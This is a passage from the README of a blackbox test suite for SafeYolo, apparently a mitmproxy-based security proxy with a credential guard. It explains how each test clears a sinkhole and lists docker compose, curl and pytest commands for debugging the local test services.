- Addon interactions and ordering effects
- Real mitmproxy behavior (TLS, headers, streaming)
- Security guarantees hold under realistic conditions

### Test Isolation

Each test clears the sinkhole before running, ensuring:
- No test pollution from previous tests
- Deterministic request counts
- Clear failure attribution

### Debugging Tips

```bash
# Start services without running tests
cd tests/blackbox
docker compose up -d safeyolo sinkhole

# Check sinkhole captured requests
curl http://localhost:19999/requests | jq

# Check SafeYolo health
curl -H "Authorization: Bearer test-token-for-blackbox-tests" \
     http://localhost:19090/health

# Tail SafeYolo logs
docker compose logs -f safeyolo

# Enter test runner for interactive debugging
docker compose run --rm test-runner bash
# Then: pytest test_credential_guard.py -v -s

# Cleanup
docker compose down -v
```
